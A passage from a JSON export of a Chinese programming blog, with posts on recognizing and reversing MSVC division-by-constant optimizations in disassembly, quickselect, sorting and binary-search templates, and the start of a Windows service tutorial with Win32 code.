溢出还原除数","categories":[{"name":"C/C++逆向","slug":"C-C-逆向","permalink":"https://4st.tech/categories/C-C-%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://4st.tech/tags/%E9%80%86%E5%90%91/"},{"name":"除法优化","slug":"除法优化","permalink":"https://4st.tech/tags/%E9%99%A4%E6%B3%95%E4%BC%98%E5%8C%96/"}]},{"title":"C/C++除法的常规优化及其识别与还原","slug":"C-C-除法的常规优化及其识别与还原","date":"2021-08-03T03:58:36.000Z","updated":"2021-08-20T13:55:07.635Z","comments":true,"path":"2021/08/03/c-c-chu-fa-de-chang-gui-you-hua-ji-qi-shi-bie-yu-huan-yuan/","link":"","permalink":"https://4st.tech/2021/08/03/c-c-chu-fa-de-chang-gui-you-hua-ji-qi-shi-bie-yu-huan-yuan/","excerpt":"","text":"大纲 本文涉及到的是除法的一般优化方法，其中特殊情况暂时不列举，涉及的知识点有： 被除数是无符号数，除以2的幂 被除数是有符号数，除以2的幂 被除数是无符号数，除以非2的幂 被除数是有符号数，除以非2的幂的常规情况，即：MagicNum没有进位和不为负数的情况 在学习的时候，需要对照着看，使用的工具是VC6.0和IDA 6.1。使用的是VC6.0的原因是其编译器对于除法优化更加激进一些，也更加不好识别一些，而VS2019等IDE的MSVC编译器已经将部分优化直接替换为了除法等指令，原因可能是因为现在的硬件对于除法指令的硬件优化更加好一些，已经在可接受范围内了，所以本文采用的是VC6.0的编译器进行练习。 需要注意的是 在编译时需要选择的是Release版本，而不能是Debug版本，开启的选项是速度优先优化选项，而不是体积优先。 在写例子的时候，需要注意传播优化、折叠优化等优化方式带来的影响 无符号数除以2的幂 示例01 - 除数为2 12345int main(int argc, char* argv[])&#123; printf(&quot;%d&quot;, (unsigned int)argc / 2); return 0;&#125; 对其反汇编进行整理，得到反汇编为： 1234567891011121314; int __cdecl main(int argc, const char **argv, const char **envp)_main proc neararg_0= dword ptr 4mov eax, [esp+arg_0]shr eax, 1push eaxpush offset s-&gt;D ; &quot;%d&quot;call printfadd esp, 8xor eax, eaxretn_main endp 发现其使用的是shr reg, 1 ，使用无符号右移指令来替代除法指令，其指令周期更短，运算更快。 示例02 - 除数为2的幂 12345int main(int argc, char* argv[])&#123; printf(&quot;%d&quot;, (unsigned int)argc / 8); return 0;&#125; 反汇编结果： 123456789101112131415.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401000 _main proc near ; CODE XREF: start+AF\u0019p.text:00401000.text:00401000 arg_0 = dword ptr 4.text:00401000.text:00401000 mov eax, [esp+arg_0].text:00401004 shr eax, 3 ; 还是使用的是无符号右移指令.text:00401007 push eax.text:00401008 push offset s-&gt;D ; &quot;%d&quot;.text:0040100D call printf.text:0040100D.text:00401012 add esp, 8.text:00401015 xor eax, eax.text:00401017 retn.text:0040 可以发现，其使用的还是无符号右移指令，右移的次数为幂次 总结 对于被除数是无符号数，而除数是2的幂的情况下，MSVC使用的是无符号右移指令，定式为： 12mov reg, x ; x为被除数shr reg, N ; N为2的幂次 还原时直接可以通过得到除数 有符号数除以2的幂 示例01 - 除数为2 12345int main(int argc, char* argv[])&#123; printf(&quot;%d&quot;, argc / 2); return 0;&#125; 观察其反汇编： 123456789101112131415161718 .text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401000 _main proc near ; CODE XREF: start+AF\u0019p.text:00401000.text:00401000 arg_0 = dword ptr 4.text:00401000.text:00401000 mov eax, [esp+arg_0].text:00401004 cdq.text:00401005 sub eax, edx.text:00401007 sar eax, 1.text:00401009 push eax.text:0040100A push offset s-&gt;D ; &quot;%d&quot;.text:0040100F call printf.text:0040100F.text:00401014 add esp, 8.text:00401017 xor eax, eax.text:00401019 retn.text:00401019.text:00401019 _main endp 可以发现其计算方法并不是简单的将无符号右移指令shr 变为sar： 1234.text:00401000 mov eax, [esp+arg_0].text:00401004 cdq.text:00401005 sub eax, edx.text:00401007 sar eax, 1 它在做什么呢？需要一行一行看。首先它将eax进行符号扩展，变为edx, eax的形式，edx保存的是有符号数arg0 的符号位。如果arg0为正数，则edx的值为0；如果arg0为负数，则edx的值为0xFFFF,FFFF，也就是-1。紧接着它用了减法操作，如果上述运算结果edx为0，则相当于该操作是无效操作；如果是-1，则相当于将被除数做了一个加一的操作。最后才做了一个带符号的右移运算，得到最终的除法运算结果。 将运算的每一步都搞清楚了好像也没明白它为什么这么做？他其实是将分支操作给转变成了无分支的操作了。在C/C++中，它的取整操作是向0取整的，也就是说，对于正数，它是向下取整；而对于负数，它是向上取整的。举个例子，3.5取整是3，-3.5取整就是-3，即：取更靠近0的整数。在这里就出现问题了，对于数学意义上来讲，-3.5的取整应该是-4，所以为了符合C/C++的向0取整约定，需要做调整，那么如何做调整呢，只需要将负数部分的向下取整变为上整即可，也就是说：-3.5 + 1 = -2.5，然后再取下整，就是-3。与向0取整的结果是一致的。 在上述描述的下整转上整其实有一个数学定理，本文并不打算将所用到的定理一一列出，而是举例子和描述出最终结果，以将笔者所理解的描述出来，证明我自己已经懂了即可。 示例02 - 除数为2的幂 12345int main(int argc, char* argv[])&#123; printf(&quot;%d&quot;, argc / 8); return 0;&#125; 反汇编结果： 12345678910111213141516171819.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401000 _main proc near ; CODE XREF: start+AF\u0019p.text:00401000.text:00401000 arg_0 = dword ptr 4.text:00401000.text:00401000 mov eax, [esp+arg_0].text:00401004 cdq.text:00401005 and edx, 7 ; 在上述基础上又多出了这么一个操作.text:00401008 add eax, edx.text:0040100A sar eax, 3.text:0040100D push eax.text:0040100E push offset s-&gt;D ; &quot;%d&quot;.text:00401013 call printf.text:00401013.text:00401018 add esp, 8.text:0040101B xor eax, eax.text:0040101D retn.text:0040101D.text:0040101D _main endp 根据示例01的分析，这个也应该是有分支转为无分支的操作（因为分支操作打乱了流水线优化，所以速度会变慢）。但是其又多了一句and edx, 7的运算，这句运算是做什么用的呢？ 12345.text:00401000 mov eax, [esp+arg_0].text:00401004 cdq.text:00401005 and edx, 7 ; 在上述基础上又多出了这么一个操作.text:00401008 add eax, edx ; 加一操作也变为了加0或者加7了.text:0040100A sar eax, 3 设a是被除数，b是除数，q是商，r是余数，则有：，可以得到： ，当时，有：，而 ，且$ |r| &lt; b$ , ，故有： 对于上述证明的通俗理解是：由于r是余数，其结果可能不为0，那么使其上整转为下整运算，分子需要加的最大整数就应该是b - 1，因为再加1，就变为了1，则当余数为0时，会影响其结果，导致计算后结果上整值和下整值不正确，因此为了保证其结果不管在什么时候都能相等，调整因子最大为b - 1 总结 对于这种的代码定式可以统一为示例02的定式，原因是示例1的为示例2的特殊情况： 12345mov reg, xcdqand edx, 2^N - 1add reg, edxsar reg, N 识别时需要先统计一共右移了几次，然后再判断其用来做与运算的值是否是​，如果是，则可以认为是被除数为有符号数而除数是2的幂的情况，还原时直接将除数还原为​ 当除数是负的2的幂的时候，只需要在最后面添加一句neg reg即可得到结果。 无符号数除以非2的幂 示例 12345int main(int argc, char* argv[])&#123; printf(&quot;%d&quot;, (unsigned int)argc / 5); return 0;&#125; 反汇编结果为： 1234567891011121314151617.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401000 _main proc near ; CODE XREF: start+AF\u0019p.text:00401000.text:00401000 arg_0 = dword ptr 4.text:00401000.text:00401000 mov eax, 0CCCCCCCDh ; 多出来一个大数.text:00401005 mul [esp+arg_0].text:00401009 shr edx, 2.text:0040100C push edx ; 乘法运算后取高32位.text:0040100D push offset s-&gt;D ; &quot;%d&quot;.text:00401012 call printf.text:00401012.text:00401017 add esp, 8.text:0040101A xor eax, eax.text:0040101C retn.text:0040101C.text:0040101C _main endp 上述反汇编结果用到的其实就是一个除法转乘法的运算，前提是除数必须是一个常量，可以在编译期间内计算出来的，原因是下列公式： 需要除数C是一个常量。 还原时只需要做逆运算：​ 总结 无符号数除以非2的幂的代码定式为： 123mov reg, MagicNummul xshr edx, n ; 使用edx相当于已经先右移了32位了，最终总的移位次数应该为N = 32 + n 代码定式使用的是无符号数的运算指令，还原时需要统计一共右移了多少位，然后再使用逆运算还原出除数。 需要注意的是，编译器在计算魔数MagicNum（就是上面反汇编中的大数）时，是作为无符号数运算的。且由于除数C不是2的幂，编译器在计算MagicNum是要做取下整操作的，因此我们在还原除数的时候，需要取上整。 有符号数除以非2的幂 这篇是一般的常规情况，即：编译器得到的MagicNum无进位现象，无需正负数调整运算结果的情况。 示例01 - 除数为正数 12345int main(int argc, char* argv[])&#123; printf(&quot;%d&quot;, argc / 5); return 0;&#125; 反汇编结果为： 123456789101112131415161718192021.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401000 _main proc near ; CODE XREF: start+AF\u0019p.text:00401000.text:00401000 arg_0 = dword ptr 4.text:00401000.text:00401000 mov ecx, [esp+arg_0].text:00401004 mov eax, 66666667h ; 注意此时MagicNum是正数.text:00401009 imul ecx.text:0040100B sar edx, 1 ; 采用的是有符号运算指令.text:0040100D mov eax, edx.text:0040100F shr eax, 1Fh.text:00401012 add edx, eax ; 运算结果下整转上整.text:00401014 push edx.text:00401015 push offset s-&gt;D ; &quot;%d&quot;.text:0040101A call printf.text:0040101A.text:0040101F add esp, 8.text:00401022 xor eax, eax.text:00401024 retn.text:00401024.text:00401024 _main endp 可以发现，MagicNum是正数，且对于负数的情况，会加1做下整转上整的操作。还原方法与无符号数除以非2的幂的情况一致。 示例02 - 除数为负数 12345int main(int argc, char* argv[])&#123; printf(&quot;%d&quot;, argc / -5); return 0;&#125; 反汇编结果为： 123456789101112131415161718192021.text:00401000 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00401000 _main proc near ; CODE XREF: start+AF\u0019p.text:00401000.text:00401000 arg_0 = dword ptr 4.text:00401000.text:00401000 mov ecx, [esp+arg_0].text:00401004 mov eax, 99999999h ; 注意此时是负数，是以补码的形式存放的.text:00401009 imul ecx.text:0040100B sar edx, 1.text:0040100D mov eax, edx.text:0040100F shr eax, 1Fh.text:00401012 add edx, eax.text:00401014 push edx.text:00401015 push offset s-&gt;D ; &quot;%d&quot;.text:0040101A call printf.text:0040101A.text:0040101F add esp, 8.text:00401022 xor eax, eax.text:00401024 retn.text:00401024.text:00401024 _main endp 此时MagicNum是负数，在还原的时候，需要先求出其真值，再还原 识别定式总结 下列总结暂时为不完全的，原因是还有一些特殊情况未被加进来： 在识别时，先观察是否有加1做调整的操作，如果有且运算指令使用的是有符号运算指令，则被除数是有符号数。 查看MagicNum是否是负数（大于等于0x8000,0000即为负数）。如果是负数，则除数是负数；否则除数是正数 附录 对于取整操作的几个有用的性质： 上下取整是相对于0点是对称的，因此对于实数x取上整/下整再取负要变取整方向。如：对，其结果等于将符号提出，并变取整方向。可以利用该性质将取整运算内的符号提出 当x为实数时，即：x不为整数时，下整和上整运算的结果相差1","categories":[{"name":"C/C++逆向","slug":"C-C-逆向","permalink":"https://4st.tech/categories/C-C-%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://4st.tech/tags/%E9%80%86%E5%90%91/"},{"name":"除法优化","slug":"除法优化","permalink":"https://4st.tech/tags/%E9%99%A4%E6%B3%95%E4%BC%98%E5%8C%96/"}]},{"title":"基础算法：快速选择算法","slug":"基础算法：快速选择算法","date":"2021-08-02T09:58:53.000Z","updated":"2021-08-04T04:57:03.045Z","comments":true,"path":"2021/08/02/ji-chu-suan-fa-kuai-su-xuan-ze-suan-fa/","link":"","permalink":"https://4st.tech/2021/08/02/ji-chu-suan-fa-kuai-su-xuan-ze-suan-fa/","excerpt":"","text":"题目要求 给定一个长度为n的整数数列，以及一个整数 k，求出数列从小到大排序后的第 k个数。即：从数列中尽可能快的找出第k小的数。 分析题目 根据上述题目的要求，如果使用排序后，再找第k个数的最低时间复杂度是nlogn的，那么可不可以不通过排序直接得到第k小的数呢？ 根据快速排序中的划分操作，可以知道每一次操作都会把不大于pivot的数放到其左边，把不小于pivot的数放到其右边，每一次都会将一整个数列划分为两组，如果在这个基础上可以知道在pivot的左半边有几个数，就可以知道pivot是第几个小的数，因此就可以判断第k小的数是位于左半边还是右半边，直接就可以舍弃一半的搜索范围。 根据上述描述， 可以得到其时间复杂度为O(N)，因为其时间复杂度是一个等比数列求和。 快速选择算法 算法流程 随机选择一个pivot 进行二分，即：快速排序的划分算法 统计在划分点pivot 左侧的数的个数，看它与要选择的第k个数的k的大小来缩小搜索区间，以此为基准来判断是选择左半边进行搜索还是右半边进行搜索 根据夹挤准则，得到第k小的数 算法的实现 该算法的实现有多种版本，只需要能把上述算法流程实现即可。这个算法使用递归来实现比较简单，需要注意递归的三要素： 递归的定义 递归的出口 递归的拆解 下面几个版本，均要求所求问题的解一定存在，否则代码会出现一些问题。 版本01 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;bits/stdc++.h&gt;const int N = 1e5 + 10;int ary[N] = &#123;0&#125;;int quickSelect(int ary[], int lo, int hi, int k) &#123; // 03.直接比较个数，当最后是1个的时候，直接返回该区间的第一个元素，就是答案 if (k &lt;= 1) &#123; return ary[lo]; &#125; // 01.划分区间 int left = lo - 1, right = hi + 1; int pivot = ary[left + (right - left) / 2]; while (left &lt; right) &#123; do ++left; while (ary[left] &lt; pivot); do --right; while (ary[right] &gt; pivot); if (left &lt; right) &#123; std::swap(ary[left], ary[right]); &#125; &#125; // 02.由于外面没有减一，需要加1做调整，然后统计左侧数的个数，然后选择合适的区间进行搜索 if (right + 1 - lo &lt; k) &#123; return quickSelect(ary, right + 1, hi, k - right - 1 + lo); &#125; else &#123; return quickSelect(ary, lo, right, k); &#125;&#125;int main() &#123; int n = 0, k = 0; scanf(&quot;%d%d&quot;, &amp;n, &amp;k); for (int i = 0; i &lt; n; ++i) &#123; scanf(&quot;%d&quot;, &amp;ary[i]); &#125; int num = quickSelect(ary, 0, n - 1, k); printf(&quot;%d&quot;, num); return 0;&#125; 版本02 该版本的作者是yxc 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;algorithm&gt;using namespace std;const int N = 100010;int n, k;int q[N];int quick_select(int l, int r)&#123; // 03.夹挤准则得到最后答案 if (l == r) return q[l]; int i = l - 1, j = r + 1, x = q[l + r &gt;&gt; 1]; while (i &lt; j) &#123; do i ++ ; while (q[i] &lt; x); do j -- ; while (q[j] &gt; x); if (i &lt; j) swap(q[i], q[j]); &#125; // 将第k小的数，与划分边界进行比较，因为是提前减去1，所以可以直接比较 // 不需要调整后再比较 if (k &lt;= j) return quick_select(l, j); return quick_select(j + 1, r);&#125;int main()&#123; scanf(&quot;%d%d&quot;, &amp;n, &amp;k); for (int i = 0; i &lt; n; i ++ ) scanf(&quot;%d&quot;, &amp;q[i]); // 提前减1，因为划分后，需要比较边界值，而其划分的边界选择的是闭区间 // 所以需要提前减1 k -- ; cout &lt;&lt; quick_select(0, n - 1) &lt;&lt; endl; return 0;&#125; 版本03 可以根据01和02可以得到一个版本3： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;bits/stdc++.h&gt;const int N = 1e5 + 10;int ary[N] = &#123;0&#125;;int quickSelect(int ary[], int lo, int hi, int k) &#123; // 03.此时答案集合里面只有一个唯一解，该解就是答案 if (lo == hi) &#123; return ary[lo]; &#125; // 01.划分区间 int left = lo - 1, right = hi + 1; int pivot = ary[left + (right - left) / 2]; while (left &lt; right) &#123; do ++left; while (ary[left] &lt; pivot); do --right; while (ary[right] &gt; pivot); if (left &lt; right) &#123; std::swap(ary[left], ary[right]); &#125; &#125; // 02.由于外面没有减一，需要加1做调整，然后统计左侧数的个数，然后选择合适的区间进行搜索 if (right &lt; k - 1) &#123; return quickSelect(ary, right + 1, hi, k); &#125; else &#123; return quickSelect(ary, lo, right, k); &#125;&#125;int main() &#123; int n = 0, k = 0; scanf(&quot;%d%d&quot;, &amp;n, &amp;k); for (int i = 0; i &lt; n; ++i) &#123; scanf(&quot;%d&quot;, &amp;ary[i]); &#125; int num = quickSelect(ary, 0, n - 1, k); printf(&quot;%d&quot;, num); return 0;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"https://4st.tech/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"快速选择算法","slug":"快速选择算法","permalink":"https://4st.tech/tags/%E5%BF%AB%E9%80%9F%E9%80%89%E6%8B%A9%E7%AE%97%E6%B3%95/"},{"name":"快速排序","slug":"快速排序","permalink":"https://4st.tech/tags/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/"}]},{"title":"基础算法：排序和二分","slug":"基础算法：排序和二分","date":"2021-05-18T00:40:17.000Z","updated":"2021-08-06T09:06:59.310Z","comments":true,"path":"2021/05/18/ji-chu-suan-fa-pai-xu-he-er-fen/","link":"","permalink":"https://4st.tech/2021/05/18/ji-chu-suan-fa-pai-xu-he-er-fen/","excerpt":"","text":"大纲 排序： 快速排序 归并排序 二分： 整数二分 浮点数二分 学习方法： 学习代码的思想 理解并记忆代码模板 模板题进行熟练，每道题一般重复3-5次即可。 排序 快速排序 基本思想 分治的思想。 确定分界点（指的是数组中的某一个数，而不是该数对应的数组下标）。随便从数组中找一个数，作为我们的分界点。有几种常用的方法： 取左边界，q[l] 取右边界，q[r] 取中间点，q[(l + r) / 2] 随机取 划分区间。根据上述选取的分界点，将整个数组分成两半，把小于等于分界点的值放到数组的左边，把大于等于分界点的值放到数组的右边。注意要求的是两个部分都是小于等于。 递归处理，即：重复上述的操作，递归处理左右两个子区间。 快速排序的难点和重点 在第二个划分区间（调整区间上）。首先要明确目标：通过某一种简单高效的方式，将数组中小于等于分界点的数放到数组的左半边，大于等于分界点的数放到数组的右半边。 输入的数据是数组的左右两个边界下标，是闭区间[lo, hi] 可以暴力处理，额外的开辟两个数组，将大于等于分界点的数放到一个临时数组中，同时将小于等于分界点的数放到另一个临时数组中。让后将这两个数组合并到原来的数组中即可。 较为优雅的方法是双指针法： 将数组虚拟添加两个哨兵节点。最左侧的哨兵节点为负无穷，最右边的哨兵节点为正无穷，两个指针的初始位置分别指向这两个虚拟哨兵节点，即： 12int left = lo - 1;int right = hi + 1; 为什么要这么设置？因为我们在移动的时候不管三七二十一，都是指针先前进一步，然后再进行判断的。所以需要先让出一个位置，避免漏掉需要判断的数据。 左侧的指针先行，当其指向的数组中的值小于分界点时，指针继续向右走（因为此时这个数应该位于数组的左半边，不用进行交换等额外操作）；如果指针指向的数组中的值大于等于分界点，此时左侧的指针停下。 右侧的指针后行，当期指向的数组中的值大于分界点时，指针继续向左走（因为此时这个数应该位于数组的右半边，不用进行交换等额外操作）；如果指针指向的数组中的值小于等于分界点时，此时右侧的指针停下 交换这两个指针指向的数组中的值，并左侧指针和右侧指针分别前进一步，然后继续上述2-3的操作。 为什么上述做法是正确的？假设在任意时刻t，此时观察左侧指针的左半边的数据的情况，其都是小于等于分界点的（因为如果是大于等于分界点的，此时已经交换了；右半边的小于等于分界点的也交换过来了）；同理，右侧指针的右半边的数据都是大于等于分界点的。所以当两个指针相遇或穿过，则满足上述我们的要求。 描述上述操作的关键点是，终止条件是什么？两个指针相遇或步过。 递归处理时的注意要点 在递归处理的时候，只要是对称的进行处理即可，如果写的是right，则右半的起始位置是right + 1 ；如果要用left，则左半边是left-1 ，而右半边的起始位置就是left 了。 但是如果你要用left 来做区间划分的边界下标，则需要注意你取的那个分界点不能是左侧边界点，即：ary[left] ，应该是ary[right] 或者其他选取方法（但是一定要上取整，不能取得左边界left这个位置），否则可能会出现边界死循环的问题。同理，如果选择的是right 来做区间划分的边界下标，则需要注意取的分界点不能是右侧边界点。 为什么会出现死循环呢？举个例子，ary = [1, 2] （递增数列），此时根据上述划分方法，则一个数组是空的，另一个是原数组，问题的规模并没有缩减，从而导致死循环，直到爆栈退出。 快速排序的一种模板 12345678910111213141516171819202122232425262728293031323334void quick_sort(int A[], int lo, int hi)&#123; // 当数组中只有1个或0个元素时，不需要进行排序，直接返回就好 if (lo &gt;= hi) &#123; return; &#125; // 指向两个哨兵节点，避免漏过数据 int left = lo - 1, right = hi + 1; int pivot = A[(lo + hi) &gt;&gt; 1]; // 两个指针还没有相遇或者穿过 while (left &lt; right) &#123; do &#123; left++; &#125; while (A[left] &lt; pivot); do &#123; right--; &#125; while (A[right] &gt; pivot); // left和right指针还未相遇 if (left &lt; right) &#123; std::swap(A[left], A[right]); &#125; &#125; quick_sort(A, lo, right); quick_sort(A, right + 1, hi);&#125; 归并排序 基本思想 同快速排序一样，是分治思想。 确定分界点下标。 先递归排序左边和右边。这样得到了一系列的有序数组列。 两两归并为有序数组直到只剩一个数组。 归并排序中的重点和难点 在于归并，即：如何将两个有序的序列合二为一。其实就是比较两个指针指向的两者中的较小者，放到新的一个数组中，直到合并完。 由于左侧的指针只会扫描左半边，右侧的指针只会扫描右半边。故：两两归并的时间复杂度是O(N)的。 对于归并排序，其每次都要两两二分，从而期望划分为 次，每次合并的时间复杂度是O(N)，故最终的时间复杂度是：O(NlogN) 归并排序的一种模板 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051void merge_sort(int A[], int lo, int hi)&#123; // 当数组中只有1个或0个元素时，不需要进行排序，直接返回就好 if (lo &gt;= hi) &#123; return; &#125; // 划分区间 int mid = (lo + hi) &gt;&gt; 1; // 递归排序两边 merge_sort(A, lo, mid); merge_sort(A, mid + 1, hi); // 合并两个有序数组到临时数组中 int left = lo, right = mid + 1; int tmp_ary_idx = 0; while (left &lt;= mid &amp;&amp; right &lt;= hi) &#123; if (A[left] &lt;= A[right]) &#123; tmp_ary[tmp_ary_idx] = A[left]; ++left; &#125; else &#123; tmp_ary[tmp_ary_idx] = A[right]; ++right; &#125; ++tmp_ary_idx; &#125; // 将剩余的部分放到临时数组中 while (left &lt;= mid) &#123; tmp_ary[tmp_ary_idx] = A[left]; ++left; &#125; while (right &lt;= hi) &#123; tmp_ary[tmp_ary_idx] = A[right]; ++right; &#125; // 将临时数组中的数据拷贝到原数组 for (int i = lo, j = 0; i &lt;= hi; ++i, ++j) &#123; A[i] = tmp_ary[j]; &#125;&#125; 二分法 整数二分 问题的本质 二分法与数据的单调性没什么必然的联系，如果要说有的话，那么就是如果数据具有单调性，那么就一定可以二分。但是可以二分的题目，不一定非得要求有单调性。 本质其实是边界。我们定义一个性质，使得在所给数据集上的左半边满足这个性质，另一半不满足这个性质。如果可以找到这个性质的话，可以把数据一分为二，那么二分就可以寻找到这个性质的边界（两个分界点都可以找到）。 寻找左侧部分的边界点（左侧部分的终点） 步骤： 找到其中间点，mid = (left + right + 1) / 2 ，注意要加1 检查这个中间点是否满足所给性质（即：左侧部分数据应该满足的性质）if(check(mid)) 如果是true，则mid一定在左侧部分，分界点（答案）应该在右半区间，所以应该将left = mid ，其答案区间应该是：[mid, right]，注意是闭区间。 如果是false，则mid一定在右侧部分，分界点（答案）应该在左半区间，所以应该将right = mid - 1，其答案区间应该是：[left, mid - 1]，注意是闭区间。（为什么是mid-1？因为mid是一定不满足所给性质的，所以可以将mid给排除掉了） 寻找右侧部分的边界点（右侧部分的起始点） 步骤： 找到其中间点，mid = (left + right) / 2 检查中间点是否满足所给性质（即：右侧部分数据应该满足的性质） 如果是true，则mid一定在左侧部分，分界点（答案）应该在左半区间，所以应该将right = mid ，其答案区间应该是：[left, mid]，注意是闭区间。（因为mid满足所给性质，所以其答案还是可能在mid这点上的） 如果是false，则mid一定在右侧部分，分界点（答案）应该在右半区间，所以应该将left = mid + 1，其答案区间应该是：[mid + 1, right]，注意是闭区间。（为什么是mid+1？因为mid是一定不满足所给性质的，所以可以将mid给排除掉了） 如何选择使用哪个方法 步骤： 先写一个check 函数 想一下这个check(mid)函数是true或者false的时候如何更新 如果更新方式是left = mid 和 right = mid - 1，则需要在计算mid时，补上分子的那个1（即：取上整） 其实核心就是看更新区间到底是left = mid 还是right = mid（在check为true的情况下），如果是left = mid ，则需要mid取上整，需要补偿加1，否则不需要补偿加1. 需要注意的是，定义一个性质之后，其二分一定是有解的（即：一定有一个边界），但是题目是不一定有解的。 为什么当check为真时left = mid要补偿加1 当left和right只差1的时候，如果mid不补偿加1的话，那么mid下取整是等于left的，如果此时check为true的，则left还是等于left，此时没有进行更新，从而会出现死循环的情况。 整数二分的模板 1234567891011121314151617181920212223242526272829303132333435363738// 用来检查var是否符合某一性质bool check(int var) &#123;&#125;// 区间[left, right]被划分为[left, mid]和[mid + 1, right]时使用int binary_search(int left, int right)&#123; while (left &lt; right) &#123; int mid = (left + right) &gt;&gt; 1; if (check(mid) == true) &#123; right = mid; &#125; else &#123; left = mid + 1; &#125; &#125; return left;&#125;// 区间[left, right]被划分为[left, mid - 1]和[mid, right]时使用int binary_search(int left, int right)&#123; while (left &lt; right) &#123; int mid = (left + right + 1) &gt;&gt; 1; if (check(mid) == true) &#123; left = mid; &#125; else &#123; right = mid - 1; &#125; &#125; return left;&#125; 浮点数二分 这里面就不需要考虑是否需要补偿了，直接就可以二分更新即可。 浮点数二分模板 123456789101112131415161718192021// 用来检查var是否符合某一性质bool check(double var) &#123;&#125;double binary_search(double left, double right)&#123; // 经验值：精度控制比题目所给的精度高-2即可，如：题目要求保留4位，则精度为1e-6即可 const double delta = 1e-6; while (right - left &gt; eps) &#123; double mid = (left + right) / 2; if (check(mid)) &#123; right = mid; &#125; else &#123; left = mid; &#125; &#125; return left;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"https://4st.tech/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"快速排序","slug":"快速排序","permalink":"https://4st.tech/tags/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/"},{"name":"排序","slug":"排序","permalink":"https://4st.tech/tags/%E6%8E%92%E5%BA%8F/"},{"name":"归并排序","slug":"归并排序","permalink":"https://4st.tech/tags/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/"},{"name":"二分","slug":"二分","permalink":"https://4st.tech/tags/%E4%BA%8C%E5%88%86/"},{"name":"整数二分","slug":"整数二分","permalink":"https://4st.tech/tags/%E6%95%B4%E6%95%B0%E4%BA%8C%E5%88%86/"},{"name":"浮点数二分","slug":"浮点数二分","permalink":"https://4st.tech/tags/%E6%B5%AE%E7%82%B9%E6%95%B0%E4%BA%8C%E5%88%86/"}]},{"title":"Windows下Ring3环服务的创建和使用","slug":"Ring3环服务的创建和使用","date":"2021-04-26T07:45:22.000Z","updated":"2021-08-04T04:57:02.775Z","comments":true,"path":"2021/04/26/ring3-huan-fu-wu-de-chuang-jian-he-shi-yong/","link":"","permalink":"https://4st.tech/2021/04/26/ring3-huan-fu-wu-de-chuang-jian-he-shi-yong/","excerpt":"","text":"服务 是没有UI界面的程序，它要长期驻扎在后台的服务程序，任何用户都可以调用他提供的服务。 如打印机，我不挑程序，什么文档编辑的程序都可以使用我这台打印机来打印。他不需要UI之类的，你需要打印东西，就把你要打印的数据给我，我去让打印机打印就行了，所以就特别适合写成服务。 什么时候使用服务程序？ 需要长期在后台运行的程序（无UI需求） 为系统所有程序提供服务 服务的创建与使用 服务的创建 可以先创建一个控制台应用程序，然后在main 函数中做以下操作： 填充DispatchTable 结构体数组，其每个成员是SERVICE_TABLE_ENTRY 类型，以NULL, NULL 结尾，标志该结构体数组结束 第一个结构体的数据成员是服务名 第二个结构体的数据成员是服务的入口函数SvcMain 调用 StartServiceCtrlDispatcher 将控制台的入口函数转换到服务程序的入口函数处 在服务的入口函数SvcMain 中需要做： 通过RegisterServiceCtrlHandler 函数注册服务，传入服务控制函数的函数指针，其相当于消息循环的调度器。当有服务请求时，通过控制码就可以通过控制码来进行相应的操作 通过CreateEvent 创建一个事件，当发来请求需要将服务状态设置为停止状态，需要退出服务，因此需要事件来进行同步 将状态设置为运行状态，通过SetServiceStatus 设置 示例代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697void WINAPI SvcMain(DWORD argc, LPTSTR* argv) &#123; OutputDebugString(&quot;[51asm] SvcMain&quot;); //注册服务控制处理 gSvcStatusHandle = RegisterServiceCtrlHandler(SVCNAME, SvcCtrlHandler); if (!gSvcStatusHandle) &#123; OutputDebugString(&quot;[51asm] 注册控制处理失败&quot;); return; &#125; gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS; gSvcStatus.dwServiceSpecificExitCode = 0; ReportSvcStatus(SERVICE_START_PENDING, NO_ERROR, 3000); SvcInit(argc, argv);&#125;//设置服务当前状态VOID ReportSvcStatus(DWORD dwCurrentState,DWORD dwWin32ExitCode, DWORD dwWaitHint)&#123; static DWORD dwCheckPoint = 1; gSvcStatus.dwCurrentState = dwCurrentState; gSvcStatus.dwWin32ExitCode = dwWin32ExitCode; gSvcStatus.dwWaitHint = dwWaitHint; if (dwCurrentState == SERVICE_START_PENDING) gSvcStatus.dwControlsAccepted = 0; else gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP; if ((dwCurrentState == SERVICE_RUNNING) || (dwCurrentState == SERVICE_STOPPED)) gSvcStatus.dwCheckPoint = 0; else gSvcStatus.dwCheckPoint = dwCheckPoint++; //设置服务状态 SetServiceStatus(gSvcStatusHandle, &amp;gSvcStatus);&#125;//服务控制处理函数VOID WINAPI SvcCtrlHandler(DWORD dwCtrl) &#123; switch (dwCtrl) &#123; case SERVICE_CONTROL_STOP: ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0); SetEvent(ghSvcStopEvent); ReportSvcStatus(gSvcStatus.dwCurrentState, NO_ERROR, 0); OutputDebugString(&quot;[51asm] 服务被停止&quot;); return; case SERVICE_CONTROL_INTERROGATE: OutputDebugString(&quot;[51asm] 服务操作&quot;); break; default: break; &#125;&#125;VOID SvcInit(DWORD dwArgc, 